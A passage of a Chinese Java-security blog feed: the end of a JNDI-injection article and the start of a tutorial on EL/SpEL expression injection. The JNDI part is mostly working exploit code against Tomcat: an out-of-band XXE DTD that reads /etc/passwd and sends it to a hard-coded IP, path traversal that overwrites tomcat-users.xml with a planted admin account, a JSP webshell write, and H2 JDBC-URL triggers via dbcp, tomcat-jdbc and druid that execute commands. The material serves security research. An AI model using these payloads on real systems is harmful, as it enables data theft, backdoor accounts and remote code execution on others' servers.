&#123;<br>                                    writer.print(<span class="hljs-string">&quot;  &quot;</span>);<br>                                    writer.println(values.next());<br>                                &#125;<br><br>                                values = <span class="hljs-built_in">this</span>.getGroups();<br><br>                                <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>                                    <span class="hljs-keyword">if</span> (!values.hasNext()) &#123;<br>                                        values = <span class="hljs-built_in">this</span>.getUsers();<br><br>                                        <span class="hljs-keyword">while</span>(values.hasNext()) &#123;<br>                                            writer.print(<span class="hljs-string">&quot;  &quot;</span>);<br>                                            writer.println(((MemoryUser)values.next()).toXml());<br>                                        &#125;<br><br>                                        writer.println(<span class="hljs-string">&quot;&lt;/tomcat-users&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>既然发起远程连接并且对XML进行了解析，那就存在XXE漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>,<span class="hljs-string">&quot;http://vps:port/exp.xml&quot;</span>));<br><span class="hljs-keyword">return</span> resourceRef;<br><br><span class="hljs-comment">/**exp.xml </span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE data SYSTEM &quot;http://101.33.203.2:8000/oob.dtd&quot;&gt;</span><br><span class="hljs-comment">&lt;data&gt;&amp;send;&lt;/data&gt;</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-comment">/**oob.dtd</span><br><span class="hljs-comment">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-comment">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://101.33.203.2:5000/?%file;&#x27;&gt;&quot;&gt;</span><br><span class="hljs-comment">%all;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><h3 id="添加后台用户"><a href="#添加后台用户" class="headerlink" title="添加后台用户"></a>添加后台用户</h3><p>Tomcat后台用户的账户密码在文件<code>&lt;CATALINA.BASE&gt;/conf/tomcat-users.xml</code>中可以进行配置，相关配置内容是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;both&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;role1&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;role1&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>前面讲到open()时提到，它会把XML解析出来的账户直接写入，写入的内容我们可控，写入路径这里我们就遇到问题了，写入路径的处理逻辑是直接拼接catalina根目录与pathname：<code> fileNew = new File(System.getProperty(&quot;catalina.base&quot;), this.pathnameNew);</code>，但我们使用远程URI的话就会出现<code>http://</code>等字符，拼接出来就是<code>&lt;CATALINA.BASE&gt;/http://1.1.1.1:2222/conf/tomcat-users.xml</code>，这时路径不存在是非法的，这时候就可以使用路径穿越的方式获取到xml文件：<code>&lt;CATALINA.BASE&gt;/http://1.1.1.1:2222/../../conf/tomcat-users.xml</code>。</p><p>这时候还有一个问题，那就是路径<code>http:/1.1.1.1:2222</code>不存在，路径穿越也是不合法的，解决的办法就是借用创建目录的方法将<code>http:/1.1.1.1:2222</code>创建出来，这里使用到的是org.h2.store.fs.FileUtils#createDirectory()。最后就可以覆盖tomcat-users.xml了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//step1: create dir</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatMkdirFrist</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=createDirectory&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;../http:&quot;</span>)); <span class="hljs-comment">//工作目录在CATALINA.BASE/bin因此目录要往前跳一级。</span><br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatMkdirLast</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=createDirectory&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;../http:/vps:8888&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">//step2: write in user fake_manager:123456</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatManagerAdd</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>, <span class="hljs-string">&quot;http://vps:8888/../../conf/tomcat-users.xml&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">/** tomcat-users.xml in http://vps:8888/conf/tomcat-users.xml</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="hljs-comment">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="hljs-comment">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="hljs-comment">              version=&quot;1.0&quot;&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;role1&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  &lt;user username=&quot;fake_manager&quot; password=&quot;123456&quot; roles=&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;/&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;/tomcat-users&gt;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><p>然后就是进后台部署war，不多说。</p><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>上一小节其实已经实现了任意文件写，因此也可以直接向网站根目录写入webshell，原理一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//step1 create dir ...</span><br><br><span class="hljs-comment">//step2 write in </span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatWriteFile</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">/** shell.jsp in http://vps:8888/webapps/ROOT/test.jsp</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="hljs-comment">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="hljs-comment">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="hljs-comment">              version=&quot;1.0&quot;&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;&amp;#x3c;%Runtime.getRuntime().exec(&amp;#x22;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#x22;); %&amp;#x3e;&quot;/&gt;</span><br><span class="hljs-comment">&lt;/tomcat-users&gt;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><h1 id="利用JDBC"><a href="#利用JDBC" class="headerlink" title="利用JDBC"></a>利用JDBC</h1><h3 id="dbcp"><a href="#dbcp" class="headerlink" title="dbcp"></a>dbcp</h3><p>同样的还是找ObjectFactory，利用JDBC可以主动发起恶意数据库连接，只需要一个String类型的参数即可，注意类<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory</code>，其getObjectInstance()方法经过层层调用会来到<code>BasicDataSource#createDataSource()</code>即发起数据库连接。</p><p>dbcp工厂类要依据本地classpath依赖来决定，存在多种，比如不是Tomcat时可以尝试使用commons-dbcp。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_dbcp2_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_dbcp1_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">commons_dbcp2_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">commons_dbcp1_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">dbcpByFactory</span><span class="hljs-params">(String factory)</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tomcat-jdbc"><a href="#tomcat-jdbc" class="headerlink" title="tomcat-jdbc"></a>tomcat-jdbc</h3><p>dbcp用不了时，可以尝试tomcat-jdbc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_JDBC_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">dbcpByFactory</span><span class="hljs-params">(String factory)</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h3><p><a href="https://xz.aliyun.com/t/10656">原理</a>同dbcp，DruidDataSourceFactory也可以发起数据库连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">druid</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul><li><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></li><li><a href="https://tttang.com/archive/1489">https://tttang.com/archive/1489</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java表达式注入</title>
    <link href="/2023/06/02/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/02/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="EL-amp-SPEL"><a href="#EL-amp-SPEL" class="headerlink" title="EL&amp;SPEL"></a>EL&amp;SPEL</h1><p>EL常用于JSP，而SPEL主要针对于spring，两者并非严格区分关系。</p><h2 id="何为EL"><a href="#何为EL" class="headerlink" title="何为EL"></a>何为EL</h2><p>EL(<a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">Expression Language</a>)是一种脚本表达式，它可以直接插入到JSP中，其主要功能有：</p><ul><li><strong>获取数据</strong>:从各种类型的<code>Web</code>域中检索<code>Java</code>对象、获取数据(某个<code>Web</code>域中的对象, 访问<code>JavaBean</code>的属性、访问<code>List</code>集合、访问<code>Map</code>集合、访问数组)。</li><li><strong>执行运算</strong>:执行一些基本的关系运算、逻辑运算和算术运算, 以在<code>JSP</code>页面中完成一些简单的逻辑运算, 例如<code>$&#123;user==null&#125;</code>。</li><li><strong>获取<code>Web</code>开发常用对象</strong>:<code>EL</code>表达式定义了一些隐式对象, 利用这些隐式对象,<code>Web</code>开发人员可以很轻松获得对<code>Web</code>常用对象的引用, 从而获得这些对象中的数据。<ul><li>可以直接获取到PageContext，访问JSP内置对象比如page<code>,</code>request<code>,</code>session<code>,</code>application。</li></ul></li><li><strong>调用<code>Java</code>方法</strong>:<code>EL</code>表达式允许用户开发自定义<code>EL</code>函数, 以在<code>JSP</code>页面中通过<code>EL</code>表达式调用<code>Java</code>类的方法。<ul><li>自定义拓展的函数与类的静态方法对应。</li></ul></li></ul><h2 id="EL基本语法"><a href="#EL基本语法" class="headerlink" title="EL基本语法"></a>EL基本语法</h2><h3 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h3><p>EL表达式用<code>$&#123;&#125;</code>进行包裹，表达式位于花括号之间。</p><h3 id="取值与赋值"><a href="#取值与赋值" class="headerlink" title="取值与赋值"></a>取值与赋值</h3><p>取值符号有两个</p><ul><li><code>.</code>：<code>$&#123;userinfo.name&#125;</code></li><li><code>[]</code>：<code>$&#123;userinfo[&#39;name&#39;]&#125;</code></li></ul><p>这两个表达式都是取出userinfo对象中的name属性，不过中括号<code>[]</code>有一些<code>.</code>不具备的特点：</p><ol><li>如果存取的属性名称包含一些特殊字符(非字母数字)，那么必须用<code>[]，</code>，比如<code>$&#123;userinfo[&#39;my-name&#39;]&#125;</code></li><li><code>[]</code>可以进行动态取值，比如<code>$&#123;userinfo[param.name]&#125;</code>中的name可以通过参数来传递。<ul><li>这一点也衍生出一个<a href="https://spr1n9t1me.github.io/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/">小trick</a>。</li></ul></li></ol><p>取值的范围在没有自定义的情况下就会依次从Page<code>、</code>Request<code>、</code>Session<code>、</code>Application中查找，如果没有找到则返回当前上下文即<code>.</code>。</p><p>赋值使用等号即可，如<code>$&#123;userinfo.name&#125;=abc</code>，实际上 <code>[]</code>、<code>.</code>可以理解为getter，<code>=</code>可以理解为<code>setter</code>。</p><h3 id="内置-隐式-对象"><a href="#内置-隐式-对象" class="headerlink" title="内置(隐式)对象"></a>内置(隐式)对象</h3><p><code>JSP</code>表达式语言定义了一些隐式对象，其中比较重要的有</p><ul><li>JSP上下文对象<ul><li>pageContext：<code>JSP</code>页的上下文, 可以用于访问<code>JSP</code>隐式对象, 如请求、响应、会话、输出、<code>servletContext</code>等. 